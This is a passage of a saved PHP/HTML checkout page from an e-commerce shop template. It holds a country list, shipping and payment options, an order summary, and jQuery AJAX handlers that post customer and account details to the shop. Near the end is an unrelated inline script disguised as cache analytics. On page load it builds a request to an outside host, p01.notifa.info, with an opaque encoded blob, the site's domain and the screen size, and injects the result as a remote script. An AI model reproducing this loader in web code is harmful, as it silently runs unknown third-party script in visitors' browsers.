                                                                        <option value="169" >Panama </option>
                                                                        <option value="170" >Papua new Guinea </option>
                                                                        <option value="171" >Paraguay </option>
                                                                        <option value="172" >Peru </option>
                                                                        <option value="173" >Philippines </option>
                                                                        <option value="174" >Pitcairn Island </option>
                                                                        <option value="175" >Poland </option>
                                                                        <option value="176" >Portugal </option>
                                                                        <option value="177" >Puerto Rico </option>
                                                                        <option value="178" >Qatar </option>
                                                                        <option value="179" >Reunion </option>
                                                                        <option value="180" >Romania </option>
                                                                        <option value="181" >Russia </option>
                                                                        <option value="182" >Rwanda </option>
                                                                        <option value="183" >Saint Helena </option>
                                                                        <option value="184" >Saint Kitts And Nevis </option>
                                                                        <option value="185" >Saint Lucia </option>
                                                                        <option value="186" >Saint Pierre and Miquelon </option>
                                                                        <option value="187" >Saint Vincent And The Grenadines </option>
                                                                        <option value="188" >Samoa </option>
                                                                        <option value="189" >San Marino </option>
                                                                        <option value="190" >Sao Tome and Principe </option>
                                                                        <option value="191" >Saudi Arabia </option>
                                                                        <option value="192" >Senegal </option>
                                                                        <option value="193" >Serbia </option>
                                                                        <option value="194" >Seychelles </option>
                                                                        <option value="195" >Sierra Leone </option>
                                                                        <option value="196" >Singapore </option>
                                                                        <option value="197" >Slovakia </option>
                                                                        <option value="198" >Slovenia </option>
                                                                        <option value="199" >Smaller Territories of the UK </option>
                                                                        <option value="200" >Solomon Islands </option>
                                                                        <option value="201" >Somalia </option>
                                                                        <option value="202" >South Africa </option>
                                                                        <option value="203" >South Georgia </option>
                                                                        <option value="204" >South Sudan </option>
                                                                        <option value="205" >Spain </option>
                                                                        <option value="206" >Sri Lanka </option>
                                                                        <option value="207" >Sudan </option>
                                                                        <option value="208" >Suriname </option>
                                                                        <option value="209" >Svalbard And Jan Mayen Islands </option>
                                                                        <option value="210" >Swaziland </option>
                                                                        <option value="211" >Sweden </option>
                                                                        <option value="212" >Switzerland </option>
                                                                        <option value="213" >Syria </option>
                                                                        <option value="214" >Taiwan </option>
                                                                        <option value="215" >Tajikistan </option>
                                                                        <option value="216" >Tanzania </option>
                                                                        <option value="217" >Thailand </option>
                                                                        <option value="218" >Togo </option>
                                                                        <option value="219" >Tokelau </option>
                                                                        <option value="220" >Tonga </option>
                                                                        <option value="221" >Trinidad And Tobago </option>
                                                                        <option value="222" >Tunisia </option>
                                                                        <option value="223" >Turkey </option>
                                                                        <option value="224" >Turkmenistan </option>
                                                                        <option value="225" >Turks And Caicos Islands </option>
                                                                        <option value="226" >Tuvalu </option>
                                                                        <option value="227" >Uganda </option>
                                                                        <option value="228" >Ukraine </option>
                                                                        <option value="229" >United Arab Emirates </option>
                                                                        <option value="230" >United Kingdom </option>
                                                                        <option value="231" >United States </option>
                                                                        <option value="232" >United States Minor Outlying Islands </option>
                                                                        <option value="233" >Uruguay </option>
                                                                        <option value="234" >Uzbekistan </option>
                                                                        <option value="235" >Vanuatu </option>
                                                                        <option value="236" >Vatican City State (Holy See) </option>
                                                                        <option value="237" >Venezuela </option>
                                                                        <option value="238" >Vietnam </option>
                                                                        <option value="239" >Virgin Islands (British) </option>
                                                                        <option value="240" >Virgin Islands (US) </option>
                                                                        <option value="241" >Wallis And Futuna Islands </option>
                                                                        <option value="242" >Western Sahara </option>
                                                                        <option value="243" >Yemen </option>
                                                                        <option value="244" >Yugoslavia </option>
                                                                        <option value="245" >Zambia </option>
                                                                        <option value="246" >Zimbabwe </option>
                                                                    </select>
                            </div>
                            <div class="form-group col-sm-6">
                                <label class="control-label" for="ship_state">State * :</label>
                                <select name="ship_state" id="ship_state" class="form-control">
                                   <option value=""> --- State --- </option>
                                                                   </select>
                            </div>
                        </div>
                    </div>
             
                    <div id="step-4">
                        <div id="form-step-3" role="form" data-toggle="validator" class="step4_inner">
                            <p>Kindly Select the preferred shipping method to use on this order.</p>
                                                        <p><strong>Dhaka City</strong></p>
                            <div class="radio">
                                <label>         
                                   <input type="radio" class="shipping_cost" name="shipping_cost"
                                   id="1" value="50" alt="Three Days Shipping Rate" >
                                    
                                    Three Days Shipping Rate - 

                                    $ 50.00                                </label>
                            </div>
                                                        <p><strong>Out Of Dhaka City</strong></p>
                            <div class="radio">
                                <label>         
                                   <input type="radio" class="shipping_cost" name="shipping_cost"
                                   id="2" value="100" alt="One Day Shipping Rate" >
                                    
                                    One Day Shipping Rate - 

                                    $ 100.00                                </label>
                            </div>
                                                        <p><strong>Pickup</strong></p>
                            <div class="radio">
                                <label>         
                                   <input type="radio" class="shipping_cost" name="shipping_cost"
                                   id="9" value="0" alt="Pickup From Store" >
                                    
                                    Pickup From Store - 

                                    $ 0.00                                </label>
                            </div>
                            
                            <div class="form-group">
                                <label class="control-label">Add Comment About Your Order.</label>
                                <textarea rows="8" class="form-control" id="delivery_details"></textarea>
                            </div>
                        </div>
                    </div>
                    <div id="step-5">
                        <div id="form-step-4" role="form" data-toggle="validator" class="step4_inner">
                            <p>Kindly Select the preferred shipping method to use on this order.</p>

                            <!-- Cash on delivery payment method -->
                            <div class="radio">
                                <label>    
                                    <input type="radio" name="payment_method" value="1"  checked>
                                    Cash On Delivery                                 </label>
                            </div>

                                                        <!-- Bit coin payment method -->
                            <div class="radio">
                                <label>        
                                   <input type="radio" name="payment_method" value="3" >
                                   <img src="http://isshue.bdtask.com/isshue-v1.5/my-assets/image/bitcoin.png">
                                    <!-- Bitcoin -->
                                 </label>
                            </div>
                            
                                                        <!-- Payeer payment method -->
                            <div class="radio">
                                <label>        
                                   <input type="radio" name="payment_method" value="4" >
                                    <img src="http://isshue.bdtask.com/isshue-v1.5/my-assets/image/payeer.png">
                                 </label>
                            </div>
                            
                                                        <!-- Payeer payment method -->
                            <div class="radio">
                                <label>        
                                   <input type="radio" name="payment_method" value="5" >
                                    <img src="http://isshue.bdtask.com/isshue-v1.5/my-assets/image/paypal.png">
                                 </label>
                            </div>
                            
                            <div class="form-group">
                                <label class="control-label">Add Comment About Your Order.</label>
                                <textarea rows="8" class="form-control" id="payment_details"></textarea>
                            </div>
                        </div>

                    </div>
                    <div id="step-6">
                        <div id="form-step-5" role="form" data-toggle="validator" class="step6_inner">
                            <div class="step6_inner">
                                <table class="table table-bordered table-hover"> 
                                    <thead> 
                                        <tr> 
                                            <td>Product Name</td> 
                                            <td>Model</td> 
                                            <td>Variant</td> 
                                            <td>Qnty</td> 
                                            <td>Price</td> 
                                            <td>Dis/ Pcs</td> 
                                            <td>Total</td> 
                                        </tr> 
                                    </thead> 
                                    <tbody> 
                                                                                                                        
<input type="hidden" name="1[rowid]" value="0b3bd7507beaee91cf9ae0a631ca2cf8" />
                                        <tr>
                                            <td>
                                                <a href="http://isshue.bdtask.com/isshue-v1.5/product_details/82567971">Print Buttoneds</a>
                                            </td>
                                            <td>ER23</td>
                                            <td>
                                            Medium 
                                            </td>
                                            <td>1</td>
                                            <td>$ 980.00</td>       

                                            <td>$ 190.00</td>

                                            <td>$ 980.00</td>
                                        </tr>

                                                                                                                       
                                    </tbody> 

                                    <tfoot>
                                         
                                        <tr>
                                            <td colspan="6" class="text-right"><strong>Total Discount:</strong></td>
                                            <td class="text-right">$ 190.00</td>
                                        </tr>
                                                                                <tr>
                                            <td colspan="6" class="text-right"><strong>:</strong></td>
                                            <td class="text-right">
                                            $ 0.00                                            </td>
                                        </tr>
                                                                                <tr>
                                            <td colspan="6" class="text-right"><strong>Total:</strong></td>
                                            <td class="text-right">
                                            $ 790.00                                            </td>
                                        </tr>
                                    </tfoot>
                                </table> 
                            </div>
                      
                        </div>
                    </div>
                </div>
            </div>
        </form>
    </div>
</section>
<!--========= End CheckOut Area ==========-->

<!--========= End CheckOut Area ==========-->

        

<!--=========== footer Area ===========-->
 
 <?php      $this->load->view('footer');         

        function rupiah($angka){
    
            echo "Rp " . number_format($angka,2,',','.');
                // return $hasil_rupiah;
         
        } 

  
        function limit_words($string, $word_limit){
            $words = explode(" ",$string);
            return implode(" ",array_splice($words,0,$word_limit));
        }
   ?>  
        
<!--=========== ./footer Area ===========-->



<!-- Push delivery cost to cache by ajax -->
<script type="text/javascript">

 //Retrive district
$('body').delegate('.sw-btn-next', 'click', function() {

    var first_name      = $('#first_name').val();
    var last_name       = $('#last_name').val();
    var customer_email  = $('#customer_email').val();
    var customer_mobile = $('#customer_mobile').val();
    var customer_address_1 = $('#customer_address_1').val();
    var customer_address_2 = $('#customer_address_2').val();
    var company         = $('#company').val();
    var city            = $('#city').val();
    var zip             = $('#zip').val();
    var country         = $('#country').val();
    var state           = $('#state').val();
    var password        = $('#password').val();
    var privacy_policy  = $('#privacy_policy').attr("checked") ? 1 : 0;
    var ship_and_bill   = $("#ship_and_bill").attr("checked") ? 1 : 0;

    var ship_first_name = $('#ship_first_name').val();
    var ship_last_name  = $('#ship_last_name').val();
    var ship_company    = $('#ship_company').val();
    var ship_mobile     = $('#ship_mobile').val();
    var ship_address_1  = $('#ship_address_1').val();
    var ship_address_2  = $('#ship_address_2').val();
    var ship_city       = $('#ship_city').val();
    var ship_zip        = $('#ship_zip').val();
    var ship_country    = $('#ship_country').val();
    var ship_state      = $('#ship_state').val();
    var payment_method  = $('input[name=\'payment_method\']:checked').val();
    var delivery_details= $('#delivery_details').val();
    var payment_details = $('#payment_details ').val();
    
    $.ajax({
        type: "post",
        url: '<?php /*  echo base_url('website/Home/account_info_save/')*/?>' + $('input[name=\'account\']:checked').val(),
        data: {
            first_name:first_name,
            last_name:last_name,
            customer_email:customer_email,
            customer_mobile:customer_mobile,
            customer_address_1:customer_address_1,
            customer_address_2:customer_address_2,
            company:company,
            city:city,
            zip:zip,
            country:country,
            state:state,
            password:password,
            ship_and_bill:ship_and_bill,
            privacy_policy:privacy_policy,
            ship_first_name:ship_first_name,
            ship_last_name:ship_last_name,
            ship_company:ship_company,
            ship_mobile:ship_mobile,
            ship_address_1:ship_address_1,
            ship_address_2:ship_address_2,
            ship_city:ship_city,
            ship_zip:ship_zip,
            ship_country:ship_country,
            ship_state:ship_state,
            payment_method:payment_method,
            delivery_details:delivery_details,
            payment_details:payment_details,
        },
       
        beforeSend: function() {
            $('#button-account').button('loading');
        },
        complete: function() {
            $('#button-account').button('reset');
        },
        success: function(html) {
             location.reload();
        },
        error: function(xhr, ajaxOptions, thrownError) {
//            alert(thrownError + "\r\n" + xhr.statusText + "\r\n" + xhr.responseText);
                        $('#wizard_form').smartWizard('next');

            location.reload();
        }
    });
}); 
</script>
<!-- Push delivery cost to cache by ajax  -->

<script type="text/javascript">
    function account_type(){
        var account_type  = $('input[name=\'account\']:checked').val();

         if (payment_method == 1) {
             $("#password_field").css("display","block");
             $("#empty_field").css("display","none");
         }else if (payment_method == 2) {
             $("#password_field").css("display","none");
             $("#empty_field").css("display","block");
         }


        $.ajax({
            type: "post",
            url: '<?php /*  echo base_url('website/Home/account_type_save/')*/?>',
            data: { account_type:account_type },
           
            beforeSend: function() {
                $('#button-account').button('loading');
            },
            complete: function() {
                $('#button-account').button('reset');
            },
            success: function(html) {
                location.reload();
            },
            error: function(xhr, ajaxOptions, thrownError) {
                alert(thrownError + "\r\n" + xhr.statusText + "\r\n" + xhr.responseText);
            }
        });
    }
</script>


<!-- if ship and billing info are same -->
<script type="text/javascript">
    function checkboxcheck(){
        var total_qntt  ='ship_and_bill';

        var first_name      = $('#first_name').val();
        var last_name       = $('#last_name').val();
        var customer_email  = $('#customer_email').val();
        var customer_mobile = $('#customer_mobile').val();
        var customer_address_1 = $('#customer_address_1').val();
        var customer_address_2 = $('#customer_address_2').val();
        var company         = $('#company').val();
        var city            = $('#city').val();
        var zip             = $('#zip').val();
        var country         = $('#country').val();
        var state           = $('#state').val();
        var password        = $('#password').val();
        var privacy_policy  = $('#privacy_policy').attr("checked") ? 1 : 0;
        var ship_first_name = $('#ship_first_name').val();
        var ship_last_name  = $('#ship_last_name').val();
        var ship_company    = $('#ship_company').val();
        var ship_mobile     = $('#ship_mobile').val();
        var ship_address_1  = $('#ship_address_1').val();
        var ship_address_2  = $('#ship_address_2').val();
        var ship_city       = $('#ship_city').val();
        var ship_zip        = $('#ship_zip').val();
        var ship_country    = $('#ship_country').val();
        var ship_state      = $('#ship_state').val();
        var payment_method  = $('input[name=\'payment_method\']:checked').val();
        var delivery_details= $('#delivery_details').val();
        var payment_details = $('#payment_details ').val();

        if($('#'+total_qntt).prop("checked") == true){
            document.getElementById(total_qntt).setAttribute("checked","checked");

            var ship_and_bill   = $("#ship_and_bill").attr("checked") ? 1 : 0;
               
            $.ajax({
                type: "post",
                url: '<?php /*  echo base_url('website/Home/account_info_save/')*/?>' + $('input[name=\'account\']:checked').val(),
                data: { 

                    first_name:first_name,
                    last_name:last_name,
                    customer_email:customer_email,
                    customer_mobile:customer_mobile,
                    customer_address_1:customer_address_1,
                    customer_address_2:customer_address_2,
                    company:company,
                    city:city,
                    zip:zip,
                    country:country,
                    state:state,
                    password:password,
                    ship_and_bill:ship_and_bill,
                    privacy_policy:privacy_policy,
                    ship_first_name:ship_first_name,
                    ship_last_name:ship_last_name,
                    ship_company:ship_company,
                    ship_mobile:ship_mobile,
                    ship_address_1:ship_address_1,
                    ship_address_2:ship_address_2,
                    ship_city:ship_city,
                    ship_zip:ship_zip,
                    ship_country:ship_country,
                    ship_state:ship_state,
                    payment_method:payment_method,
                    delivery_details:delivery_details,
                    payment_details:payment_details,

                 },
               
                beforeSend: function() {
                    $('#button-account').button('loading');
                },
                complete: function() {
                    $('#button-account').button('reset');
                },
                success: function(html) {
                    location.reload();
                },
                error: function(xhr, ajaxOptions, thrownError) {
                    alert(thrownError + "\r\n" + xhr.statusText + "\r\n" + xhr.responseText);
                }
            });

        }else if($('#'+total_qntt).prop("checked") == false){
            document.getElementById(total_qntt).removeAttribute("checked");

            var ship_and_bill   = $("#ship_and_bill").attr("checked") ? 1 : 0;
               
            $.ajax({
                type: "post",
                url: '<?php /*  echo base_url('website/Home/account_info_save/')*/?>' + $('input[name=\'account\']:checked').val(),
                data: { 
                    first_name:first_name,
                    last_name:last_name,
                    customer_email:customer_email,
                    customer_mobile:customer_mobile,
                    customer_address_1:customer_address_1,
                    customer_address_2:customer_address_2,
                    company:company,
                    city:city,
                    zip:zip,
                    country:country,
                    state:state,
                    password:password,
                    ship_and_bill:ship_and_bill,
                    privacy_policy:privacy_policy,
                    ship_first_name:ship_first_name,
                    ship_last_name:ship_last_name,
                    ship_company:ship_company,
                    ship_mobile:ship_mobile,
                    ship_address_1:ship_address_1,
                    ship_address_2:ship_address_2,
                    ship_city:ship_city,
                    ship_zip:ship_zip,
                    ship_country:ship_country,
                    ship_state:ship_state,
                    payment_method:payment_method,
                    delivery_details:delivery_details,
                    payment_details:payment_details,

                 },
               
                beforeSend: function() {
                    $('#button-account').button('loading');
                },
                complete: function() {
                    $('#button-account').button('reset');
                },
                success: function(html) {

                    location.reload();
                },
                error: function(xhr, ajaxOptions, thrownError) {
                    alert(thrownError + "\r\n" + xhr.statusText + "\r\n" + xhr.responseText);
                }
            });
        }
    };

    function checkboxcheck_privacy(){
        var total_qntt  ='privacy_policy';
        if($('#'+total_qntt).prop("checked") == true){
            document.getElementById(total_qntt).setAttribute("checked","checked");
        }
        else if($('#'+total_qntt).prop("checked") == false){
            document.getElementById(total_qntt).removeAttribute("checked");
        }
    };
</script>


<script type="text/javascript">
    $(document).ready(function(){
        // Toolbar extra buttons
        var btnFinish = $('<button></button>').text('submit').addClass('btn submit_btn').on('click', function(){ 
            if( !$(this).hasClass('disabled')){ 
                var elmForm = $("#myForm");
                if(elmForm){
                    elmForm.validator('validate'); 
                    var elmErr = elmForm.find('.has-error');
                    if(elmErr && elmErr.length > 0){
                        alert('Please fill up all required field !');
                        return false;    
                    }else{
                        var x = confirm('<?php /*  echo display('are_you_sure_want_to_order')*/?>');
                        if (x==true){
                            elmForm.submit();
                            return false;
                        }
                        return false;
                    }
                }
            }
        });
        var btnCancel = $('<button></button>').text('Cancel').addClass('btn btn_cancel').on('click', function(){ 
            $('#wizard_form').smartWizard("reset"); 
            $('#myForm').find("input, textarea").val(""); 
        }); 

        // Smart Wizard
        $('#wizard_form').smartWizard({ 
            selected: 0, 
            theme: 'dots',
            transitionEffect:'fade',
            toolbarSettings: {toolbarPosition: 'bottom',
                toolbarExtraButtons: [btnFinish, btnCancel]
            },
            anchorSettings: {
                markDoneStep: true, // add done css
                markAllPreviousStepsAsDone: true, // When a step selected by url hash, all previous steps are marked done
                removeDoneStepOnNavigateBack: true, // While navigate back done step after active step will be cleared
                enableAnchorOnDoneStep: true // Enable/Disable the done steps navigation
            }
         });
        
        $("#wizard_form").on("leaveStep", function(e, anchorObject, stepNumber, stepDirection) {
            var elmForm = $("#form-step-" + stepNumber);
            // stepDirection === 'forward' :- this condition allows to do the form validation 
            // only on forward navigation, that makes easy navigation on backwards still do the validation when going next
            if(stepDirection === 'forward' && elmForm){
                elmForm.validator('validate'); 
                var elmErr = elmForm.children('.has-error');
                if(elmErr && elmErr.length > 0){
                    // Form validation failed
                    return false;    
                }
            }
            return true;
        });
        
        $("#wizard_form").on("showStep", function(e, anchorObject, stepNumber, stepDirection) {
            // Enable finish button only on last step
            if(stepNumber == 4){ 
                $('.btn-finish').removeClass('disabled');  
            }else{
                $('.btn-finish').addClass('disabled');
            }
        });                               
        
    });   
</script>

<!-- Retrive district ajax code start-->
<script type="text/javascript">
    //Retrive district
    $('body').on('change', '#country', function() {
        var country_id = $('#country').val();
        if (country_id == 0) {
            alert('Please select email.');
            return false;
        }
        $.ajax({
            type: "post",
            async: true,
            url: '<?php /*  echo base_url('website/Home/retrive_district')*/?>',
            data: {country_id:country_id},
            success: function(data) {
                if (data) {
                    $("#state").html(data);
                }else{
                    $("#state").html('<p style="color:red>Failed !</p>'); 
                }
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    }); 
</script>
<!-- Retrive district ajax code end-->

<!-- Retrive shipping district ajax code start-->
<script type="text/javascript">
    //Retrive district
    $('body').on('change', '#ship_country', function() {
        var country_id = $('#ship_country').val();
        if (country_id == 0) {
            alert('Please select email.');
            return false;
        }
        $.ajax({
            type: "post",
            async: true,
            url: '<?php /*  echo base_url('website/Home/retrive_district')*/?>',
            data: {country_id:country_id},
            success: function(data) {

                if (data) {
                    $("#ship_state").html(data);
                }else{
                    $("#ship_state").html('<p style="color:red>Failed !</p>'); 
                }
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    }); 
</script>
<!-- Retrive shipping district ajax code end -->

<!-- Push delivery cost to cache by ajax -->
<script type="text/javascript">
    //Retrive district
    $('body').on('click', '.shipping_cost', function() {
        var shipping_cost  = $(this).val();
        var ship_cost_name = $(this).attr('alt');
        var method_id = $(this).attr('id');
        $.ajax({
            type: "post",
            async: true,
            url: '<?php /*  echo base_url('website/Home/set_ship_cost_cart')*/?>',
            data: {shipping_cost:shipping_cost,ship_cost_name:ship_cost_name,method_id:method_id},
            success: function(data) {
                location.reload();
                // if (data) {
                //    return true;
                // }else{
                //     $("#ship_state").html('<p style="color:red>Failed !</p>'); 
                // }
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    }); 
</script>
<!-- Push delivery cost to cache by ajax  -->

        <!-- Bootstrap  -->
        <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/tether.min.js'?>" type="text/javascript"></script>
        <script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/bootstrap.min.js'?>" type="text/javascript"></script>

        <script type="text/javascript" src="cdnjs.cloudflare.com/ajax/libs/1000hz-bootstrap-validator/0.11.5/validator.min.js'?>"></script>

        <!-- Include SmartWizard JavaScript source -->
        <script type="text/javascript" src="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/js/jquery.smartWizard.min.js'?>"></script>

        <!-- Owl Carousel -->
        <script src="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.js'?>" type="text/javascript"></script>

        <!-- EasyZoom -->
        <script src="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.js'?>" type="text/javascript"></script>

        <!-- DSCount JS -->
        <script src="<?php echo base_url().'assets/website/vendor/dscountdown/dscountdown.min.js'?>" type="text/javascript"></script>
        
        <!-- WoW js -->
        <script src="<?php echo base_url().'assets/website/vendor/wow-js/wow.min.js'?>"></script>
        
        <!-- Lightbox js -->
        <script src="<?php echo base_url().'assets/website/vendor/lightbox/js/lightbox.min.js'?>"></script>  

        <!-- Simple Share js -->
        <script src="<?php echo base_url().'assets/website/js/jquery.simpleSocialShare.min.js'?>"></script>

        <!-- Custom scripts for this template -->
        <script src="<?php echo base_url().'assets/website/js/theme.js'?>"></script>

        <script type="text/javascript">

            //Simple share
            $('.share-button').simpleSocialShare();
            
            //Change language ajax
            $('body').on('change', '#change_language', function() {
                var language  = $('#change_language').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_language',
                    data: {language:language},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Change currency ajax
            $('body').on('change', '#change_currency', function() {
                var currency_id  = $('#change_currency').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_currency',
                    data: {currency_id:currency_id},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Add to cart by ajax
            function add_to_cart(id){
                var product_id = $('#product_id_'+id).val();
                var price      = $('#price_'+id).val();
                var discount   = $('#discount_'+id).val();
                var qnty       = $('#qnty_'+id).val();
                var image      = $('#image_'+id).val();
                var name       = $('#name_'+id).val();
                var model      = $('#model_'+id).val();
                var supplier_price      = $('#supplier_price_'+id).val();
                var cgst      = $('#cgst_'+id).val();
                var cgst_id   = $('#cgst_id_'+id).val();
                var sgst      = $('#sgst_'+id).val();
                var sgst_id   = $('#sgst_id_'+id).val();
                var igst      = $('#igst_'+id).val();
                var igst_id   = $('#igst_id_'+id).val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart',
                    data: {
                        product_id:product_id,
                        price:price,
                        discount:discount,
                        qnty:qnty,
                        image:image,
                        name:name,
                        model:model,
                        supplier_price:supplier_price,
                        cgst:cgst,
                        cgst_id:cgst_id,
                        sgst:sgst,
                        sgst_id:sgst_id,
                        igst:igst,
                        igst_id:igst_id,
                    },
                    beforeSend: function(){
                        $('.preloader').html("<img src='assets/website/image/loader.gif'>");
                    },
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }

            //Add to cart by ajax
            function cart_btn(product_id){
                var qnty       = $('#sst').val();
                var variant    = $('#select_size1').val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                if (qnty <= 0) {
                    alert('Please keep quantity up to zero !');
                    return false;
                }
                if (variant != 'undefine') {
                    if (variant <= 0) {
                        alert('Please select product size !');
                        return false;
                    }
                }
                
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart_details',
                    data: {product_id:product_id,qnty:qnty,variant:variant},
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }
        </script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    
    
        <!--timer-->
        
<script>
// Set the date we're counting down to
var countDownDate = new Date("Aug 31, 2018 15:37:25").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

    // Get todays date and time
    var now = new Date().getTime();
    
    // Find the distance between now and the count down date
    var distance = countDownDate - now;
    
    // Time calculations for days, hours, minutes and seconds
    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    // Output the result in an element with id="demo"
    document.getElementById("demo").innerHTML = days + "d " + hours + "h "
    + minutes + "m " + seconds + "s ";
    
    // If the count down is over, write some text 
    if (distance < 0) {
        clearInterval(x);
        document.getElementById("demo").innerHTML = "EXPIRED";
    }
}, 1000);
</script>
        
    </body>


</html>
